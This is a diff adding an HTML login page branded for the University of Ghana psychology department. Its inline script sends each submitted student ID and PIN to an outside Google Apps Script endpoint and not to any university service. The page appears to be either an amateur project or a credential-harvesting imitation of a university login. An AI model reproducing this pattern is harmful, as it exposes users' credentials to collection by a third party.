@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="Description" content="Enter your description here"/>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
+    integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+<link rel="stylesheet" href="assets/css/style.css">
+<link rel="icon" href="assets/img/University_of_Ghana.png">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
+    integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"
+    crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js"
+    integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
+    crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js"
+    integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
+    crossorigin="anonymous"></script>
+    <script type = "text/javascript" src ="assets/js/main.js" defer></script>
+<title>UGPSYCHIC-DEPARTMENT OF PYSCHOLOGY UNIVERSITY OF GHANA, LEGON</title>
+
+</head>
+</head>
+<body>
+
+
+
+<div class="logincontain ">
+<div class="box ">
+    <div class="form ">
+        <!-- spinner -->
+        <div class="lds-roller">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+        <!-- spinner -->
+            <!--left-->
+            <div class="loginleft col-sm-12 " >
+                <div class="logincontainer col-sm-12">
+                    <img src="assets/img/University_of_Ghana.png">
+                    <h2>log in </h2>
+                    <form name="login">
+                        <input type="text" name="username" placeholder="STUDENT ID"  required>
+                        <input type="password" name="password" placeholder="PIN"  required>
+                        <!-- <input type="submit" value="Log in"> -->
+                        <button type="submit"> log in</button>
+                        
+                    </form>
+                </div>
+            </div>
+            <!--left-->
+    </div>
+</div>
+
+</div>
+
+
+
+
+</body>
+
+
+
+<script>
+$(".lds-roller").hide()
+
+  const script_url = 'https://script.google.com/macros/s/AKfycbwugfZ7iURwuGCkg5irfFd48DamG4aVgbWuG0I2--SNwScZK-f_4d66pELqcj0TZL53/exec'
+  const Login = document.forms['login']
+  Login.addEventListener('submit', e => {
+    e.preventDefault()
+$(".lds-roller").show()
+    fetch(script_url, { method: 'post', body: new FormData(Login)})
+       .then(function(){
+        response => console.log('Success!', response);
+$(".lds-roller").hide()
+        console.log('fired')
+        //window.location.replace("home.html")
+       }
+       )
+      .catch(error => console.error('Error!', error.message))
+    
+  })
+  
+ 
+  
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</html>
